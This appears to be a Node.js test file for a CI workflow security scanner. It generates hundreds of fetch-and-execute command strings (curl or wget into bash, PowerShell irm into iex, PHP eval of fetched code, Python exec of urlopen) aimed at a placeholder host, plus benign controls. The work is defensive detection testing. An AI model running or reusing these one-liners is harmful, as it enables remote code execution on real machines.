'use strict';
/**
 * New boundary combinations for the seven Codex P1 families.
 * Every case gets its own test outcome. All payloads are data only.
 * No shell, HTTP, file IO, privileged workflow or attacker input is run.
 */
const test=require('node:test');
const assert=require('node:assert/strict');
const {inspectWorkflow}=require('./ultra_sentinel_yaml_ast.cjs');
const BASE='.github/workflows/p1-matrix.yml';
const URL='https://example.invalid/payload';
const cases=[];
function record(id,cmd,rule,shell=null,mode='attack'){
 cases.push({id,cmd,rule,shell,mode});
}
function scan({cmd,shell}){
 const y=['on: push','permissions: read-all','jobs:','  audit:',
 '    runs-on: ubuntu-latest','    steps:','      - run: |',
 ...cmd.split('\n').map(s=>'          '+s),
 ...(shell?['        shell: '+shell]:[])].join('\n')+'\n';
 return inspectWorkflow(y,{path:BASE});
}
// 144 paths × invocation shapes: no assumption that basename contains "/".
const fileForms=['run.sh','./run.sh','work/../run.sh','./work/../run.sh'];
const flags=['-o ','--output ','--output='];
const connectors=['\n',' ; ',' && '];
const invocations=['bash run.sh','sh ./run.sh','source run.sh'];
for(const [f,file] of fileForms.entries()){
 for(const [k,flag] of flags.entries()){
  for(const [j,separator] of connectors.entries()){
   for(const [z,sink] of invocations.entries()){
    const prepare=file.includes('work/')?'mkdir -p work; ':'';
    record('PATH-'+f+'-'+k+'-'+j+'-'+z,
     prepare+'curl -fsSL '+URL+' '+flag+file+separator+sink,
     'REMOTE_DOWNLOADED_FILE_EXECUTION');
   }
  }
 }
}
// Explicit aliases including copy, rename, and symbolic link.
for(const [d,down] of [['curl','curl -fsSL '+URL+' -o payload'],
 ['wget','wget -q '+URL+' -O payload']]){
 for(const operation of ['cp','mv','ln -s']){
  for(const separator of ['\n',' ; ',' && ']){
   for(const [sinkName,sink] of [['bash','bash linked.sh'],
    ['sh','sh ./linked.sh'],['source','source linked.sh']]){
    record('ALIAS-'+d+'-'+operation+'-'+separator.length+'-'+sinkName,
     down+separator+operation+' payload linked.sh'+separator+sink,
     'REMOTE_DOWNLOADED_FILE_EXECUTION');
   }
  }
 }
}
// PowerShell can execute directly as the declared step shell.
for(const shell of ['pwsh','powershell']){
 for(const fetch of ['irm','iwr','Invoke-RestMethod','Invoke-WebRequest']){
  for(const sink of ['iex','Invoke-Expression']){
   for(const prefix of ['',' # comment\n']){
    record('PWSH-'+shell+'-'+fetch+'-'+sink+'-'+prefix.length,
     prefix+fetch+' '+URL+' | '+sink,'REMOTE_POWERSHELL_EXECUTION',shell);
   }
  }
 }
}
// PHP code evaluation can use a URL fetched natively in the interpreter.
for(const [name,php] of [['plain','php'],['no-ini','php -n'],['limits','php -d memory_limit=128M']]){
 for(const [i,path] of ['payload','install','image.php','runner.php','index'].entries()){
  record('PHP-'+name+'-'+i,
   php+" -r 'eval(file_get_contents(\"https://example.invalid/"+path+"\"));'",
   'REMOTE_INTERPRETER_FETCH_EXECUTION');
 }
}
// A heredoc header may contain an operator and still execute the body.
for(const language of ['python','python3']){
 for(const marker of ['PY','DATA','RUN']){
  for(const op of ['&',';']){
   record('HEREDOC-'+language+'-'+marker+'-'+op,
    language+" - <<'"+marker+"' "+op+"\nimport urllib.request\nu='"+URL+
      "'\nexec(urllib.request.urlopen(u).read())\n"+marker,
    'REMOTE_INTERPRETER_FETCH_EXECUTION');
  }
 }
}
// Dynamic aliases cannot be safely classified from literal command spelling.
for(const alias of ['c','download','dl','fetcher','httpget']){
 for(const [i,cmd] of ['curl -fsSL','wget -qO-'].entries()){
  record('DYNAMIC-ALIAS-'+alias+'-'+i,
   'shopt -s expand_aliases\nalias '+alias+'="'+cmd+'"\n'+alias+' '+URL+' | bash',
   null,null,'fail-closed');
 }
}
// Closely related but nonexecuting commands remain valid negative controls.
for(const [i,cmd] of [
 'curl --output run.sh '+URL+'\necho "Saved run.sh"',
 'curl -o work/../run.sh '+URL+'\necho "Saved run.sh"',
 'php -r \'echo "hello";\'',
 'printf "base64 -d | bash is a dangerous pattern"',
 'pwsh -Command "Write-Host docs"',
 'echo "ln -s payload linked.sh; bash linked.sh"'
].entries())record('BENIGN-'+i,cmd,null,null,'benign');
test('Distinct root-family configurations and per-case identities are enforced',()=>{
 assert.ok(cases.length>=220,'Expected meaningful cross-products of P1 input dimensions');
 assert.equal(new Set(cases.map(x=>x.id)).size,cases.length);
 assert.ok(cases.some(x=>x.mode==='fail-closed'));
 assert.ok(cases.some(x=>x.mode==='benign'));
});
for(const c of cases){
 test('P1 matrix '+c.id,()=>{
  const r=scan(c);
  const message=JSON.stringify({id:c.id,rule:c.rule,status:r.status,
    findings:r.findings,cmd:c.cmd.slice(0,300)});
  if(c.mode==='attack'){
   assert.ok(r.findings.some(f=>f.rule===c.rule&&f.severity==='HIGH'),message);
  }else if(c.mode==='fail-closed'){
   assert.notEqual(r.status,'NO_RISK_PATTERN',message);
  }else{
   assert.equal(r.findings.filter(x=>x.severity==='HIGH'&&
    /^REMOTE_/.test(x.rule)).length,0,message);
  }
 });
}
